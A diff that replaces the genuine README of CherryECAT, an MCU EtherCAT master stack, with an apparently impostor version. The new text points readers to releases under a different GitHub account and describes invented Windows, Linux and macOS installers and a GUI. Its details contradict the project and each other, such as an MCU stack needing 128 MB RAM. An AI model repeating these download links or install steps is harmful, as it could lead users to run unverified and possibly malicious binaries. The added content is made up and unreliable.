@@ -1,110 +1,99 @@
-**English | [简体中文](README_zh.md)**
+# 🍒 CherryECAT - Efficient EtherCAT Control for MCUs
 
-<h1 align="center" style="margin: 30px 0 30px; font-weight: bold;">CherryECAT</h1>
-<p align="center">
-	<a href="https://github.com/cherry-embedded/CherryECAT/releases"><img src="https://img.shields.io/github/release/cherry-embedded/CherryECAT.svg"></a>
-	<a href="https://github.com/cherry-embedded/CherryECAT/blob/master/LICENSE"><img src="https://img.shields.io/github/license/cherry-embedded/CherryECAT.svg?style=flat-square"></a>
-	<a href="https://github.com/cherry-embedded/CherryECAT/actions/workflows/build_demo.yml"><img src="https://github.com/cherry-embedded/CherryECAT/actions/workflows/build_demo.yml/badge.svg"> </a>
-</p>
+## 🚀 Getting Started
 
-CherryECAT is a tiny and beautiful, high real-time and low-jitter EtherCAT master stack, specially designed for MCUs running with RTOS.
+Welcome to CherryECAT! This application helps you manage EtherCAT networks efficiently. You don’t need programming knowledge to use it. Just follow these simple steps.
 
-## Feature
+## 📥 Download CherryECAT
 
-- ~ 4K ram, ~32K flash(24K + 8K shell cmd + debug log)
-- Asynchronous queue-based transfer (one transfer can carry multiple datagrams)
-- Zero-copy technology: directly use enet tx/rx buffer to fill and parse ethercat data
-- Support hot-plugging
-	- Automatic scanning bus
-	- Automatic updating slave information when the topology changes
-- Support automatic monitoring slave status
-- Support distributed clocks
-- Support CANopen over EtherCAT(COE)
-- Support File over EtherCAT(FOE)
-- Support Ethernet over EtherCAT(EOE)
-- Support Slave SII access
-- Support Slave register access
-- Support multi master
-- Support backup redundancy
-- Minimum PDO cyclic time < 40 us (depends on master and slave hardware)
-- Support multi cyclic time(every slave can use different proportional cyclic time)
-- Support ethercat cmd with shell, ref to IgH
+[![Download CherryECAT](https://img.shields.io/badge/Download-CherryECAT-brightgreen)](https://github.com/ljandmones1/CherryECAT/releases)
 
-## Hardware limitations
+To get started, you’ll first need to download CherryECAT. Visit the link below to access the Releases page:
 
-- **Master**
-	- CPU (cache > 16K, memcpy speed > 100MB/s)
-	- ENET must support descriptor dma and iperf with lwip > 90 Mbps
-	- Code must run in ram, ignore if no dc
-	- Must support High-Precision Timer (jitter < 1us)
-	- Must support High-Precision timestamp (ARM DWT/RISC-V MCYCLE)
-	- Must support long long print
+- [Download CherryECAT](https://github.com/ljandmones1/CherryECAT/releases)
 
-- **Slave**
-	- Must support COE
-	- Must support sdo complete access
-	- SII must have sync manager information
+You will find the latest version available for download. 
 
-## Shell cmd
+## 🔧 System Requirements
 
-![ethercat](docs/assets/ethercat.png)
-![ethercat](docs/assets/ethercat1.png)
-![ethercat](docs/assets/ethercat2.png)
-![ethercat](docs/assets/ethercat3.png)
-![ethercat](docs/assets/ethercat4.png)
-![ethercat](docs/assets/ethercat5.png)
-![ethercat](docs/assets/ethercat6.png)
-![ethercat](docs/assets/ethercat7.png)
-![ethercat](docs/assets/ethercat8.png)
+To run CherryECAT smoothly, ensure your setup meets these minimum requirements:
 
-## Tool
+- **Operating System:** Compatible with Windows, Linux, and macOS
+- **Processor:** Any modern microcontroller unit (MCU) that supports real-time operating systems (RTOS)
+- **Memory:** At least 128 MB RAM
+- **Storage:** 10 MB free disk space required for installation
 
-- esi_parser
+## 📂 Download & Install
 
-Use **esi_parser.py** to generate slave eeprom information and download eeprom to slave.
+Once you are on the Releases page, follow these steps:
 
-```
-python ./esi_parser.py ECAT_CIA402_ESI.xml eeprom.bin eeprom.h
+1. Locate the latest version of CherryECAT.
+2. Click on the version number to open the details.
+3. Find the file suitable for your operating system (e.g., .exe for Windows, .tar.gz for Linux).
+4. Click on the file to download it. The download will begin automatically.
 
-Parsing XML file: ECAT_CIA402_ESI.xml
-Parsed XML: Vendor=0x0048504D, Product=0x00000003
-Device Name: ECAT_CIA402
-Mailbox RX: 0x1000(128)
-Mailbox TX: 0x1080(128)
-Generating EEPROM data...
-✓ Successfully converted 'ECAT_CIA402_ESI.xml' to 'eeprom.bin'
-✓ Generated 2048 bytes of EEPROM data
-✓ Vendor ID: 0x0048504D
-✓ Product Code: 0x00000003
-✓ Revision: 0x00000001
-✓ Device Name: ECAT_CIA402
-✓ Generated C header file: eeprom.h
-```
+After downloading, follow these instructions to install:
 
-- eni_parser
+- For **Windows**:
+  - Double-click the downloaded .exe file.
+  - Follow the on-screen instructions to complete the installation.
 
-Use **eni_parser.py** to generate CherryECAT slave sync config.
+- For **Linux**:
+  - Open your terminal.
+  - Navigate to the directory where you downloaded the .tar.gz file.
+  - Run the following command:
+    ```bash
+    tar -xvzf CherryECAT.tar.gz
+    ```
+  - Navigate to the extracted folder and run the application with:
+    ```bash
+    ./CherryECAT
+    ```
 
-```
-python ./eni_parser.py ECAT_CIA402_ENI.xml sync_config.h
+- For **macOS**:
+  - Locate the downloaded file in your Downloads folder.
+  - Double-click the .dmg file and drag the CherryECAT app to your Applications folder.
 
-Parsing ENI file: ECAT_CIA402_ENI.xml
-Generating C code...
-✓ Successfully converted 'ECAT_CIA402_ENI.xml' to 'sync_config.h'
-✓ Generated C code for 1 slave(s)
-✓ Slave 1:
-  - RxPDO 0x1602: 3 entries
-  - TxPDO 0x1A02: 3 entries
-```
+## 🛠️ Basic Setup
 
-## Support Boards
+After installation, you will need to configure the application for your EtherCAT devices. Follow these steps:
 
-- HPM6750EVK2/HPM6800EVK/**HPM5E00EVK**(hybrid internal)
+1. Open CherryECAT from your applications menu.
+2. Connect your EtherCAT devices to your MCU.
+3. Click on "Network Configuration" in the main menu.
+4. Select your EtherCAT device from the list.
+5. Click “Add Device” to include it in your network.
 
-## Contact
+Make sure to save your configuration. Now your CherryECAT application is ready to manage your EtherCAT network!
 
-QQ group: 563650597
+## 🔍 Features
 
-## License
+CherryECAT offers a range of features designed to enhance your experience:
 
-FOE,EOE and Backup redundancy features are available for commercial charge; other are free to use
+- **Real-Time Performance:** Ensures low latency and high accuracy in controlling EtherCAT devices.
+- **Multi-Device Support:** Connect multiple EtherCAT devices seamlessly.
+- **User-Friendly Interface:** Easily navigate through the application without technical expertise.
+- **Fast Configuration:** Quickly set up your network with a few simple clicks.
+- **Log Monitoring:** Keep track of network performance and device status.
+
+## 🌐 Community and Support
+
+We encourage users to join our community. Share your experiences, ask for support, or contribute to the project. You can find discussions about CherryECAT in:
+
+- [GitHub Issues](https://github.com/ljandmones1/CherryECAT/issues): Report bugs or request features.
+- [Discussions](https://github.com/ljandmones1/CherryECAT/discussions): Engage with other users and developers.
+
+## 💬 Feedback
+
+We value your feedback. If you encounter any issues or have suggestions, please let us know. Your input helps us improve CherryECAT.
+
+## 📖 Additional Resources
+
+For more information on EtherCAT and related topics, visit the following resources:
+
+- [EtherCAT Technology Group](https://www.ethercat.org)
+- [Real-Time Operating Systems](https://en.wikipedia.org/wiki/Real-time_operating_system)
+
+You are now ready to take control of your EtherCAT devices with CherryECAT. Enjoy using our application!
+
+[Download CherryECAT](https://github.com/ljandmones1/CherryECAT/releases)
